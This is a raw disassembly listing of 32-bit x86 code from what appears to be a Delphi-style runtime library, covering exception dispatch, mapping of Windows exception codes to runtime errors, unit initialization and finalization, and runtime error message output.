  402fe8:	54                   	push   %esp
  402fe9:	6a 01                	push   $0x1
  402feb:	6a 00                	push   $0x0
  402fed:	68 e0 fa ed 0e       	push   $0xeedfae0
  402ff2:	ff 15 10 b0 40 00    	call   *0x40b010
  402ff8:	83 c4 04             	add    $0x4,%esp
  402ffb:	58                   	pop    %eax
  402ffc:	c3                   	ret
  402ffd:	8d 40 00             	lea    0x0(%eax),%eax
  403000:	80 3d 1c a0 40 00 01 	cmpb   $0x1,0x40a01c
  403007:	76 07                	jbe    0x403010
  403009:	50                   	push   %eax
  40300a:	53                   	push   %ebx
  40300b:	e9 d8 ff ff ff       	jmp    0x402fe8
  403010:	c3                   	ret
  403011:	8d 40 00             	lea    0x0(%eax),%eax
  403014:	85 c9                	test   %ecx,%ecx
  403016:	74 19                	je     0x403031
  403018:	8b 41 01             	mov    0x1(%ecx),%eax
  40301b:	80 39 e9             	cmpb   $0xe9,(%ecx)
  40301e:	74 0c                	je     0x40302c
  403020:	80 39 eb             	cmpb   $0xeb,(%ecx)
  403023:	75 0c                	jne    0x403031
  403025:	0f be c0             	movsbl %al,%eax
  403028:	41                   	inc    %ecx
  403029:	41                   	inc    %ecx
  40302a:	eb 03                	jmp    0x40302f
  40302c:	83 c1 05             	add    $0x5,%ecx
  40302f:	01 c1                	add    %eax,%ecx
  403031:	c3                   	ret
  403032:	8b c0                	mov    %eax,%eax
  403034:	80 3d 1c a0 40 00 01 	cmpb   $0x1,0x40a01c
  40303b:	76 1d                	jbe    0x40305a
  40303d:	50                   	push   %eax
  40303e:	52                   	push   %edx
  40303f:	51                   	push   %ecx
  403040:	e8 cf ff ff ff       	call   0x403014
  403045:	51                   	push   %ecx
  403046:	54                   	push   %esp
  403047:	6a 01                	push   $0x1
  403049:	6a 00                	push   $0x0
  40304b:	68 e1 fa ed 0e       	push   $0xeedfae1
  403050:	ff 15 10 b0 40 00    	call   *0x40b010
  403056:	59                   	pop    %ecx
  403057:	59                   	pop    %ecx
  403058:	5a                   	pop    %edx
  403059:	58                   	pop    %eax
  40305a:	c3                   	ret
  40305b:	90                   	nop
  40305c:	80 3d 1c a0 40 00 01 	cmpb   $0x1,0x40a01c
  403063:	76 12                	jbe    0x403077
  403065:	52                   	push   %edx
  403066:	54                   	push   %esp
  403067:	6a 01                	push   $0x1
  403069:	6a 00                	push   $0x0
  40306b:	68 e2 fa ed 0e       	push   $0xeedfae2
  403070:	ff 15 10 b0 40 00    	call   *0x40b010
  403076:	5a                   	pop    %edx
  403077:	c3                   	ret
  403078:	50                   	push   %eax
  403079:	52                   	push   %edx
  40307a:	80 3d 1c a0 40 00 01 	cmpb   $0x1,0x40a01c
  403081:	76 10                	jbe    0x403093
  403083:	54                   	push   %esp
  403084:	6a 02                	push   $0x2
  403086:	6a 00                	push   $0x0
  403088:	68 e3 fa ed 0e       	push   $0xeedfae3
  40308d:	ff 15 10 b0 40 00    	call   *0x40b010
  403093:	5a                   	pop    %edx
  403094:	58                   	pop    %eax
  403095:	c3                   	ret
  403096:	8b c0                	mov    %eax,%eax
  403098:	8b 44 24 04          	mov    0x4(%esp),%eax
  40309c:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  4030a3:	0f 85 13 01 00 00    	jne    0x4031bc
  4030a9:	81 38 de fa ed 0e    	cmpl   $0xeedfade,(%eax)
  4030af:	8b 50 18             	mov    0x18(%eax),%edx
  4030b2:	8b 48 14             	mov    0x14(%eax),%ecx
  4030b5:	74 6e                	je     0x403125
  4030b7:	fc                   	cld
  4030b8:	e8 0f fd ff ff       	call   0x402dcc
  4030bd:	8b 15 0c b0 40 00    	mov    0x40b00c,%edx
  4030c3:	85 d2                	test   %edx,%edx
  4030c5:	0f 84 f1 00 00 00    	je     0x4031bc
  4030cb:	ff d2                	call   *%edx
  4030cd:	85 c0                	test   %eax,%eax
  4030cf:	0f 84 e7 00 00 00    	je     0x4031bc
  4030d5:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4030d9:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4030dd:	81 39 ce fa ef 0e    	cmpl   $0xeefface,(%ecx)
  4030e3:	74 37                	je     0x40311c
  4030e5:	e8 da fe ff ff       	call   0x402fc4
  4030ea:	80 3d 20 a0 40 00 00 	cmpb   $0x0,0x40a020
  4030f1:	76 29                	jbe    0x40311c
  4030f3:	80 3d 1c a0 40 00 00 	cmpb   $0x0,0x40a01c
  4030fa:	77 20                	ja     0x40311c
  4030fc:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  403100:	50                   	push   %eax
  403101:	51                   	push   %ecx
  403102:	e8 71 df ff ff       	call   0x401078
  403107:	83 f8 00             	cmp    $0x0,%eax
  40310a:	58                   	pop    %eax
  40310b:	0f 84 ab 00 00 00    	je     0x4031bc
  403111:	89 c2                	mov    %eax,%edx
  403113:	8b 44 24 04          	mov    0x4(%esp),%eax
  403117:	8b 48 0c             	mov    0xc(%eax),%ecx
  40311a:	eb 30                	jmp    0x40314c
  40311c:	89 c2                	mov    %eax,%edx
  40311e:	8b 44 24 04          	mov    0x4(%esp),%eax
  403122:	8b 48 0c             	mov    0xc(%eax),%ecx
  403125:	80 3d 20 a0 40 00 01 	cmpb   $0x1,0x40a020
  40312c:	76 1e                	jbe    0x40314c
  40312e:	80 3d 1c a0 40 00 00 	cmpb   $0x0,0x40a01c
  403135:	77 15                	ja     0x40314c
  403137:	50                   	push   %eax
  403138:	8d 44 24 08          	lea    0x8(%esp),%eax
  40313c:	52                   	push   %edx
  40313d:	51                   	push   %ecx
  40313e:	50                   	push   %eax
  40313f:	e8 34 df ff ff       	call   0x401078
  403144:	83 f8 00             	cmp    $0x0,%eax
  403147:	59                   	pop    %ecx
  403148:	5a                   	pop    %edx
  403149:	58                   	pop    %eax
  40314a:	74 70                	je     0x4031bc
  40314c:	83 48 04 02          	orl    $0x2,0x4(%eax)
  403150:	53                   	push   %ebx
  403151:	31 db                	xor    %ebx,%ebx
  403153:	56                   	push   %esi
  403154:	57                   	push   %edi
  403155:	55                   	push   %ebp
  403156:	64 8b 1b             	mov    %fs:(%ebx),%ebx
  403159:	53                   	push   %ebx
  40315a:	50                   	push   %eax
  40315b:	52                   	push   %edx
  40315c:	51                   	push   %ecx
  40315d:	8b 54 24 28          	mov    0x28(%esp),%edx
  403161:	6a 00                	push   $0x0
  403163:	50                   	push   %eax
  403164:	68 70 31 40 00       	push   $0x403170
  403169:	52                   	push   %edx
  40316a:	ff 15 14 b0 40 00    	call   *0x40b014
  403170:	8b 7c 24 28          	mov    0x28(%esp),%edi
  403174:	e8 8f 18 00 00       	call   0x404a08
  403179:	ff b0 00 00 00 00    	push   0x0(%eax)
  40317f:	89 a0 00 00 00 00    	mov    %esp,0x0(%eax)
  403185:	8b 6f 08             	mov    0x8(%edi),%ebp
  403188:	8b 5f 04             	mov    0x4(%edi),%ebx
  40318b:	c7 47 04 9c 31 40 00 	movl   $0x40319c,0x4(%edi)
  403192:	83 c3 05             	add    $0x5,%ebx
  403195:	e8 66 fe ff ff       	call   0x403000
  40319a:	ff e3                	jmp    *%ebx
  40319c:	e9 23 00 00 00       	jmp    0x4031c4
  4031a1:	e8 62 18 00 00       	call   0x404a08
  4031a6:	8b 88 00 00 00 00    	mov    0x0(%eax),%ecx
  4031ac:	8b 11                	mov    (%ecx),%edx
  4031ae:	89 90 00 00 00 00    	mov    %edx,0x0(%eax)
  4031b4:	8b 41 08             	mov    0x8(%ecx),%eax
  4031b7:	e9 84 fc ff ff       	jmp    0x402e40
  4031bc:	b8 01 00 00 00       	mov    $0x1,%eax
  4031c1:	c3                   	ret
  4031c2:	8b c0                	mov    %eax,%eax
  4031c4:	8b 44 24 04          	mov    0x4(%esp),%eax
  4031c8:	8b 54 24 08          	mov    0x8(%esp),%edx
  4031cc:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  4031d3:	74 1f                	je     0x4031f4
  4031d5:	8b 4a 04             	mov    0x4(%edx),%ecx
  4031d8:	c7 42 04 f4 31 40 00 	movl   $0x4031f4,0x4(%edx)
  4031df:	53                   	push   %ebx
  4031e0:	56                   	push   %esi
  4031e1:	57                   	push   %edi
  4031e2:	55                   	push   %ebp
  4031e3:	8b 6a 08             	mov    0x8(%edx),%ebp
  4031e6:	83 c1 05             	add    $0x5,%ecx
  4031e9:	e8 46 fe ff ff       	call   0x403034
  4031ee:	ff d1                	call   *%ecx
  4031f0:	5d                   	pop    %ebp
  4031f1:	5f                   	pop    %edi
  4031f2:	5e                   	pop    %esi
  4031f3:	5b                   	pop    %ebx
  4031f4:	b8 01 00 00 00       	mov    $0x1,%eax
  4031f9:	c3                   	ret
  4031fa:	8b c0                	mov    %eax,%eax
  4031fc:	8b 44 24 30          	mov    0x30(%esp),%eax
  403200:	c7 40 04 47 32 40 00 	movl   $0x403247,0x4(%eax)
  403207:	e8 fc 17 00 00       	call   0x404a08
  40320c:	8b 90 00 00 00 00    	mov    0x0(%eax),%edx
  403212:	8b 0a                	mov    (%edx),%ecx
  403214:	89 88 00 00 00 00    	mov    %ecx,0x0(%eax)
  40321a:	8b 42 0c             	mov    0xc(%edx),%eax
  40321d:	83 60 04 fd          	andl   $0xfffffffd,0x4(%eax)
  403221:	81 38 de fa ed 0e    	cmpl   $0xeedfade,(%eax)
  403227:	74 0d                	je     0x403236
  403229:	8b 42 08             	mov    0x8(%edx),%eax
  40322c:	e8 0f fc ff ff       	call   0x402e40
  403231:	e8 72 fd ff ff       	call   0x402fa8
  403236:	31 c0                	xor    %eax,%eax
  403238:	83 c4 14             	add    $0x14,%esp
  40323b:	64 8b 10             	mov    %fs:(%eax),%edx
  40323e:	59                   	pop    %ecx
  40323f:	8b 12                	mov    (%edx),%edx
  403241:	89 11                	mov    %edx,(%ecx)
  403243:	5d                   	pop    %ebp
  403244:	5f                   	pop    %edi
  403245:	5e                   	pop    %esi
  403246:	5b                   	pop    %ebx
  403247:	b8 01 00 00 00       	mov    $0x1,%eax
  40324c:	c3                   	ret
  40324d:	8d 40 00             	lea    0x0(%eax),%eax
  403250:	e8 b3 17 00 00       	call   0x404a08
  403255:	8b 90 00 00 00 00    	mov    0x0(%eax),%edx
  40325b:	8b 0a                	mov    (%edx),%ecx
  40325d:	89 88 00 00 00 00    	mov    %ecx,0x0(%eax)
  403263:	8b 42 08             	mov    0x8(%edx),%eax
  403266:	e8 d5 fb ff ff       	call   0x402e40
  40326b:	5a                   	pop    %edx
  40326c:	8b 64 24 2c          	mov    0x2c(%esp),%esp
  403270:	31 c0                	xor    %eax,%eax
  403272:	59                   	pop    %ecx
  403273:	64 89 08             	mov    %ecx,%fs:(%eax)
  403276:	58                   	pop    %eax
  403277:	5d                   	pop    %ebp
  403278:	e8 df fd ff ff       	call   0x40305c
  40327d:	ff e2                	jmp    *%edx
  40327f:	c3                   	ret
  403280:	31 d2                	xor    %edx,%edx
  403282:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403286:	8b 44 24 04          	mov    0x4(%esp),%eax
  40328a:	83 c1 05             	add    $0x5,%ecx
  40328d:	64 89 02             	mov    %eax,%fs:(%edx)
  403290:	ff d1                	call   *%ecx
  403292:	c2 0c 00             	ret    $0xc
  403295:	c3                   	ret
  403296:	8b c0                	mov    %eax,%eax
  403298:	55                   	push   %ebp
  403299:	8b ec                	mov    %esp,%ebp
  40329b:	8b 55 08             	mov    0x8(%ebp),%edx
  40329e:	8b 02                	mov    (%edx),%eax
  4032a0:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  4032a5:	7f 2c                	jg     0x4032d3
  4032a7:	74 5c                	je     0x403305
  4032a9:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  4032ae:	7f 15                	jg     0x4032c5
  4032b0:	74 57                	je     0x403309
  4032b2:	2d 05 00 00 c0       	sub    $0xc0000005,%eax
  4032b7:	74 5c                	je     0x403315
  4032b9:	2d 87 00 00 00       	sub    $0x87,%eax
  4032be:	74 3d                	je     0x4032fd
  4032c0:	48                   	dec    %eax
  4032c1:	74 4e                	je     0x403311
  4032c3:	eb 60                	jmp    0x403325
  4032c5:	05 71 ff ff 3f       	add    $0x3fffff71,%eax
  4032ca:	83 e8 02             	sub    $0x2,%eax
  4032cd:	72 36                	jb     0x403305
  4032cf:	74 30                	je     0x403301
  4032d1:	eb 52                	jmp    0x403325
  4032d3:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  4032d8:	7f 11                	jg     0x4032eb
  4032da:	74 3d                	je     0x403319
  4032dc:	2d 93 00 00 c0       	sub    $0xc0000093,%eax
  4032e1:	74 2e                	je     0x403311
  4032e3:	48                   	dec    %eax
  4032e4:	74 13                	je     0x4032f9
  4032e6:	48                   	dec    %eax
  4032e7:	74 24                	je     0x40330d
  4032e9:	eb 3a                	jmp    0x403325
  4032eb:	2d fd 00 00 c0       	sub    $0xc00000fd,%eax
  4032f0:	74 2f                	je     0x403321
  4032f2:	83 e8 3d             	sub    $0x3d,%eax
  4032f5:	74 26                	je     0x40331d
  4032f7:	eb 2c                	jmp    0x403325
  4032f9:	b0 c8                	mov    $0xc8,%al
  4032fb:	eb 2a                	jmp    0x403327
  4032fd:	b0 c9                	mov    $0xc9,%al
  4032ff:	eb 26                	jmp    0x403327
  403301:	b0 cd                	mov    $0xcd,%al
  403303:	eb 22                	jmp    0x403327
  403305:	b0 cf                	mov    $0xcf,%al
  403307:	eb 1e                	jmp    0x403327
  403309:	b0 c8                	mov    $0xc8,%al
  40330b:	eb 1a                	jmp    0x403327
  40330d:	b0 d7                	mov    $0xd7,%al
  40330f:	eb 16                	jmp    0x403327
  403311:	b0 ce                	mov    $0xce,%al
  403313:	eb 12                	jmp    0x403327
  403315:	b0 d8                	mov    $0xd8,%al
  403317:	eb 0e                	jmp    0x403327
  403319:	b0 da                	mov    $0xda,%al
  40331b:	eb 0a                	jmp    0x403327
  40331d:	b0 d9                	mov    $0xd9,%al
  40331f:	eb 06                	jmp    0x403327
  403321:	b0 ca                	mov    $0xca,%al
  403323:	eb 02                	jmp    0x403327
  403325:	b0 ff                	mov    $0xff,%al
  403327:	25 ff 00 00 00       	and    $0xff,%eax
  40332c:	8b 52 0c             	mov    0xc(%edx),%edx
  40332f:	e8 98 f5 ff ff       	call   0x4028cc
  403334:	5d                   	pop    %ebp
  403335:	c2 04 00             	ret    $0x4
  403338:	8b 44 24 04          	mov    0x4(%esp),%eax
  40333c:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  403343:	0f 85 89 00 00 00    	jne    0x4033d2
  403349:	80 3d 1c a0 40 00 00 	cmpb   $0x0,0x40a01c
  403350:	77 0f                	ja     0x403361
  403352:	8d 44 24 04          	lea    0x4(%esp),%eax
  403356:	50                   	push   %eax
  403357:	e8 1c dd ff ff       	call   0x401078
  40335c:	83 f8 00             	cmp    $0x0,%eax
  40335f:	74 71                	je     0x4033d2
  403361:	8b 44 24 04          	mov    0x4(%esp),%eax
  403365:	fc                   	cld
  403366:	e8 61 fa ff ff       	call   0x402dcc
  40336b:	8b 54 24 08          	mov    0x8(%esp),%edx
  40336f:	6a 00                	push   $0x0
  403371:	50                   	push   %eax
  403372:	68 7e 33 40 00       	push   $0x40337e
  403377:	52                   	push   %edx
  403378:	ff 15 14 b0 40 00    	call   *0x40b014
  40337e:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  403382:	81 3b de fa ed 0e    	cmpl   $0xeedfade,(%ebx)
  403388:	8b 53 14             	mov    0x14(%ebx),%edx
  40338b:	8b 43 18             	mov    0x18(%ebx),%eax
  40338e:	74 1d                	je     0x4033ad
  403390:	8b 15 0c b0 40 00    	mov    0x40b00c,%edx
  403396:	85 d2                	test   %edx,%edx
  403398:	0f 84 fa fe ff ff    	je     0x403298
  40339e:	89 d8                	mov    %ebx,%eax
  4033a0:	ff d2                	call   *%edx
  4033a2:	85 c0                	test   %eax,%eax
  4033a4:	0f 84 ee fe ff ff    	je     0x403298
  4033aa:	8b 53 0c             	mov    0xc(%ebx),%edx
  4033ad:	e8 c6 fc ff ff       	call   0x403078
  4033b2:	8b 0d 04 b0 40 00    	mov    0x40b004,%ecx
  4033b8:	85 c9                	test   %ecx,%ecx
  4033ba:	74 02                	je     0x4033be
  4033bc:	ff d1                	call   *%ecx
  4033be:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4033c2:	b8 d9 00 00 00       	mov    $0xd9,%eax
  4033c7:	8b 51 14             	mov    0x14(%ecx),%edx
  4033ca:	89 14 24             	mov    %edx,(%esp)
  4033cd:	e9 72 03 00 00       	jmp    0x403744
  4033d2:	31 c0                	xor    %eax,%eax
  4033d4:	c3                   	ret
  4033d5:	8d 40 00             	lea    0x0(%eax),%eax
  4033d8:	31 d2                	xor    %edx,%edx
  4033da:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4033dd:	64 8b 0a             	mov    %fs:(%edx),%ecx
  4033e0:	64 89 02             	mov    %eax,%fs:(%edx)
  4033e3:	89 08                	mov    %ecx,(%eax)
  4033e5:	c7 40 04 38 33 40 00 	movl   $0x403338,0x4(%eax)
  4033ec:	89 68 08             	mov    %ebp,0x8(%eax)
  4033ef:	a3 24 b6 40 00       	mov    %eax,0x40b624
  4033f4:	c3                   	ret
  4033f5:	8d 40 00             	lea    0x0(%eax),%eax
  4033f8:	31 d2                	xor    %edx,%edx
  4033fa:	a1 24 b6 40 00       	mov    0x40b624,%eax
  4033ff:	85 c0                	test   %eax,%eax
  403401:	74 1c                	je     0x40341f
  403403:	64 8b 0a             	mov    %fs:(%edx),%ecx
  403406:	39 c8                	cmp    %ecx,%eax
  403408:	75 08                	jne    0x403412
  40340a:	8b 00                	mov    (%eax),%eax
  40340c:	64 89 02             	mov    %eax,%fs:(%edx)
  40340f:	c3                   	ret
  403410:	8b 09                	mov    (%ecx),%ecx
  403412:	83 f9 ff             	cmp    $0xffffffff,%ecx
  403415:	74 08                	je     0x40341f
  403417:	39 01                	cmp    %eax,(%ecx)
  403419:	75 f5                	jne    0x403410
  40341b:	8b 00                	mov    (%eax),%eax
  40341d:	89 01                	mov    %eax,(%ecx)
  40341f:	c3                   	ret
  403420:	55                   	push   %ebp
  403421:	8b ec                	mov    %esp,%ebp
  403423:	83 c4 f8             	add    $0xfffffff8,%esp
  403426:	53                   	push   %ebx
  403427:	56                   	push   %esi
  403428:	57                   	push   %edi
  403429:	be 20 b6 40 00       	mov    $0x40b620,%esi
  40342e:	8b 46 08             	mov    0x8(%esi),%eax
  403431:	85 c0                	test   %eax,%eax
  403433:	74 54                	je     0x403489
  403435:	8b 5e 0c             	mov    0xc(%esi),%ebx
  403438:	8b 40 04             	mov    0x4(%eax),%eax
  40343b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40343e:	33 c0                	xor    %eax,%eax
  403440:	55                   	push   %ebp
  403441:	68 75 34 40 00       	push   $0x403475
  403446:	64 ff 30             	push   %fs:(%eax)
  403449:	64 89 20             	mov    %esp,%fs:(%eax)
  40344c:	85 db                	test   %ebx,%ebx
  40344e:	7e 1b                	jle    0x40346b
  403450:	4b                   	dec    %ebx
  403451:	89 5e 0c             	mov    %ebx,0xc(%esi)
  403454:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403457:	8b 44 d8 04          	mov    0x4(%eax,%ebx,8),%eax
  40345b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40345e:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  403462:	74 03                	je     0x403467
  403464:	ff 55 f8             	call   *-0x8(%ebp)
  403467:	85 db                	test   %ebx,%ebx
  403469:	7f e5                	jg     0x403450
  40346b:	33 c0                	xor    %eax,%eax
  40346d:	5a                   	pop    %edx
  40346e:	59                   	pop    %ecx
  40346f:	59                   	pop    %ecx
  403470:	64 89 10             	mov    %edx,%fs:(%eax)
  403473:	eb 14                	jmp    0x403489
  403475:	e9 1e fc ff ff       	jmp    0x403098
  40347a:	e8 a1 ff ff ff       	call   0x403420
  40347f:	e8 78 fd ff ff       	call   0x4031fc
  403484:	e8 c7 fd ff ff       	call   0x403250
  403489:	5f                   	pop    %edi
  40348a:	5e                   	pop    %esi
  40348b:	5b                   	pop    %ebx
  40348c:	59                   	pop    %ecx
  40348d:	59                   	pop    %ecx
  40348e:	5d                   	pop    %ebp
  40348f:	c3                   	ret
  403490:	55                   	push   %ebp
  403491:	8b ec                	mov    %esp,%ebp
  403493:	83 c4 f8             	add    $0xfffffff8,%esp
  403496:	53                   	push   %ebx
  403497:	56                   	push   %esi
  403498:	57                   	push   %edi
  403499:	bf 20 b6 40 00       	mov    $0x40b620,%edi
  40349e:	8b 47 08             	mov    0x8(%edi),%eax
  4034a1:	85 c0                	test   %eax,%eax
  4034a3:	74 54                	je     0x4034f9
  4034a5:	8b 30                	mov    (%eax),%esi
  4034a7:	33 db                	xor    %ebx,%ebx
  4034a9:	8b 40 04             	mov    0x4(%eax),%eax
  4034ac:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4034af:	33 c0                	xor    %eax,%eax
  4034b1:	55                   	push   %ebp
  4034b2:	68 e5 34 40 00       	push   $0x4034e5
  4034b7:	64 ff 30             	push   %fs:(%eax)
  4034ba:	64 89 20             	mov    %esp,%fs:(%eax)
  4034bd:	3b f3                	cmp    %ebx,%esi
  4034bf:	7e 1a                	jle    0x4034db
  4034c1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4034c4:	8b 04 d8             	mov    (%eax,%ebx,8),%eax
  4034c7:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4034ca:	43                   	inc    %ebx
  4034cb:	89 5f 0c             	mov    %ebx,0xc(%edi)
  4034ce:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4034d2:	74 03                	je     0x4034d7
  4034d4:	ff 55 f8             	call   *-0x8(%ebp)
  4034d7:	3b f3                	cmp    %ebx,%esi
  4034d9:	7f e6                	jg     0x4034c1
  4034db:	33 c0                	xor    %eax,%eax
  4034dd:	5a                   	pop    %edx
  4034de:	59                   	pop    %ecx
  4034df:	59                   	pop    %ecx
  4034e0:	64 89 10             	mov    %edx,%fs:(%eax)
  4034e3:	eb 14                	jmp    0x4034f9
  4034e5:	e9 ae fb ff ff       	jmp    0x403098
  4034ea:	e8 31 ff ff ff       	call   0x403420
  4034ef:	e8 08 fd ff ff       	call   0x4031fc
  4034f4:	e8 57 fd ff ff       	call   0x403250
  4034f9:	5f                   	pop    %edi
  4034fa:	5e                   	pop    %esi
  4034fb:	5b                   	pop    %ebx
  4034fc:	59                   	pop    %ecx
  4034fd:	59                   	pop    %ecx
  4034fe:	5d                   	pop    %ebp
  4034ff:	c3                   	ret
  403500:	c7 05 10 b0 40 00 68 	movl   $0x401068,0x40b010
  403507:	10 40 00 
  40350a:	c7 05 14 b0 40 00 70 	movl   $0x401070,0x40b014
  403511:	10 40 00 
  403514:	a3 28 b6 40 00       	mov    %eax,0x40b628
  403519:	33 c0                	xor    %eax,%eax
  40351b:	a3 2c b6 40 00       	mov    %eax,0x40b62c
  403520:	89 15 30 b6 40 00    	mov    %edx,0x40b630
  403526:	8b 42 04             	mov    0x4(%edx),%eax
  403529:	a3 1c b0 40 00       	mov    %eax,0x40b01c
  40352e:	e8 a5 fe ff ff       	call   0x4033d8
  403533:	c6 05 24 b0 40 00 00 	movb   $0x0,0x40b024
  40353a:	e8 51 ff ff ff       	call   0x403490
  40353f:	c3                   	ret
  403540:	53                   	push   %ebx
  403541:	56                   	push   %esi
  403542:	57                   	push   %edi
  403543:	be 60 a0 40 00       	mov    $0x40a060,%esi
  403548:	b1 10                	mov    $0x10,%cl
  40354a:	8b 1d 00 a0 40 00    	mov    0x40a000,%ebx
  403550:	8b c3                	mov    %ebx,%eax
  403552:	bf 0a 00 00 00       	mov    $0xa,%edi
  403557:	99                   	cltd
  403558:	f7 ff                	idiv   %edi
  40355a:	80 c2 30             	add    $0x30,%dl
  40355d:	33 c0                	xor    %eax,%eax
  40355f:	8a c1                	mov    %cl,%al
  403561:	88 14 06             	mov    %dl,(%esi,%eax,1)
  403564:	8b c3                	mov    %ebx,%eax
  403566:	bb 0a 00 00 00       	mov    $0xa,%ebx
  40356b:	99                   	cltd
  40356c:	f7 fb                	idiv   %ebx
  40356e:	8b d8                	mov    %eax,%ebx
  403570:	49                   	dec    %ecx
  403571:	85 db                	test   %ebx,%ebx
  403573:	75 db                	jne    0x403550
  403575:	b1 1c                	mov    $0x1c,%cl
  403577:	a1 04 a0 40 00       	mov    0x40a004,%eax
  40357c:	8b d0                	mov    %eax,%edx
  40357e:	83 e2 0f             	and    $0xf,%edx
  403581:	8a 92 80 a0 40 00    	mov    0x40a080(%edx),%dl
  403587:	33 db                	xor    %ebx,%ebx
  403589:	8a d9                	mov    %cl,%bl
  40358b:	88 14 1e             	mov    %dl,(%esi,%ebx,1)
  40358e:	c1 e8 04             	shr    $0x4,%eax
  403591:	49                   	dec    %ecx
  403592:	85 c0                	test   %eax,%eax
  403594:	75 e6                	jne    0x40357c
  403596:	5f                   	pop    %edi
  403597:	5e                   	pop    %esi
  403598:	5b                   	pop    %ebx
  403599:	c3                   	ret
  40359a:	8b c0                	mov    %eax,%eax
  40359c:	31 c0                	xor    %eax,%eax
  40359e:	87 05 00 a0 40 00    	xchg   %eax,0x40a000
  4035a4:	f7 d8                	neg    %eax
  4035a6:	19 c0                	sbb    %eax,%eax
  4035a8:	40                   	inc    %eax
  4035a9:	bf 20 b6 40 00       	mov    $0x40b620,%edi
  4035ae:	8b 5f 18             	mov    0x18(%edi),%ebx
  4035b1:	8b 6f 14             	mov    0x14(%edi),%ebp
  4035b4:	ff 77 1c             	push   0x1c(%edi)
  4035b7:	ff 77 20             	push   0x20(%edi)
  4035ba:	8b 37                	mov    (%edi),%esi
  4035bc:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4035c1:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4035c3:	5f                   	pop    %edi
  4035c4:	5e                   	pop    %esi
  4035c5:	c9                   	leave
  4035c6:	c2 0c 00             	ret    $0xc
  4035c9:	c3                   	ret
  4035ca:	8b c0                	mov    %eax,%eax
  4035cc:	51                   	push   %ecx
  4035cd:	80 3d 34 b0 40 00 00 	cmpb   $0x0,0x40b034
  4035d4:	74 57                	je     0x40362d
  4035d6:	66 81 3d 08 b2 40 00 	cmpw   $0xd7b2,0x40b208
  4035dd:	b2 d7 
  4035df:	75 14                	jne    0x4035f5
  4035e1:	83 3d 10 b2 40 00 00 	cmpl   $0x0,0x40b210
  4035e8:	76 0b                	jbe    0x4035f5
  4035ea:	b8 04 b2 40 00       	mov    $0x40b204,%eax
  4035ef:	ff 15 20 b2 40 00    	call   *0x40b220
  4035f5:	6a 00                	push   $0x0
  4035f7:	8d 44 24 04          	lea    0x4(%esp),%eax
  4035fb:	50                   	push   %eax
  4035fc:	6a 1e                	push   $0x1e
  4035fe:	68 60 a0 40 00       	push   $0x40a060
  403603:	6a f5                	push   $0xfffffff5
  403605:	e8 56 da ff ff       	call   0x401060
  40360a:	50                   	push   %eax
  40360b:	e8 70 da ff ff       	call   0x401080
  403610:	6a 00                	push   $0x0
  403612:	8d 44 24 04          	lea    0x4(%esp),%eax
  403616:	50                   	push   %eax
  403617:	6a 02                	push   $0x2
  403619:	68 54 36 40 00       	push   $0x403654
  40361e:	6a f5                	push   $0xfffffff5
  403620:	e8 3b da ff ff       	call   0x401060
  403625:	50                   	push   %eax
  403626:	e8 55 da ff ff       	call   0x401080
  40362b:	5a                   	pop    %edx
  40362c:	c3                   	ret
  40362d:	80 3d 24 a0 40 00 00 	cmpb   $0x0,0x40a024
  403634:	75 13                	jne    0x403649
  403636:	6a 00                	push   $0x0
  403638:	68 58 a0 40 00       	push   $0x40a058
  40363d:	68 60 a0 40 00       	push   $0x40a060
  403642:	6a 00                	push   $0x0
  403644:	e8 4f da ff ff       	call   0x401098
  403649:	5a                   	pop    %edx
  40364a:	c3                   	ret
  40364b:	00 ff                	add    %bh,%bh
  40364d:	ff                   	(bad)
  40364e:	ff                   	(bad)
  40364f:	ff 02                	incl   (%edx)
  403651:	00 00                	add    %al,(%eax)
  403653:	00 0d 0a 00 00 53    	add    %cl,0x5300000a
  403659:	56                   	push   %esi
  40365a:	57                   	push   %edi
  40365b:	55                   	push   %ebp
  40365c:	51                   	push   %ecx
  40365d:	bb 20 b6 40 00       	mov    $0x40b620,%ebx
  403662:	be 30 b0 40 00       	mov    $0x40b030,%esi
  403667:	80 7b 28 00          	cmpb   $0x0,0x28(%ebx)
  40366b:	75 16                	jne    0x403683
  40366d:	83 3e 00             	cmpl   $0x0,(%esi)
  403670:	74 11                	je     0x403683
  403672:	8b 06                	mov    (%esi),%eax
  403674:	89 04 24             	mov    %eax,(%esp)
  403677:	33 c0                	xor    %eax,%eax
  403679:	89 06                	mov    %eax,(%esi)
  40367b:	ff 14 24             	call   *(%esp)
  40367e:	83 3e 00             	cmpl   $0x0,(%esi)
  403681:	75 ef                	jne    0x403672
  403683:	83 3d 04 a0 40 00 00 	cmpl   $0x0,0x40a004
  40368a:	74 11                	je     0x40369d
  40368c:	e8 af fe ff ff       	call   0x403540
  403691:	e8 36 ff ff ff       	call   0x4035cc
  403696:	33 c0                	xor    %eax,%eax
  403698:	a3 04 a0 40 00       	mov    %eax,0x40a004
  40369d:	80 7b 28 02          	cmpb   $0x2,0x28(%ebx)
  4036a1:	75 0e                	jne    0x4036b1
  4036a3:	83 3d 00 a0 40 00 00 	cmpl   $0x0,0x40a000
  4036aa:	75 05                	jne    0x4036b1
  4036ac:	33 c0                	xor    %eax,%eax
  4036ae:	89 43 0c             	mov    %eax,0xc(%ebx)
  4036b1:	e8 6a fd ff ff       	call   0x403420
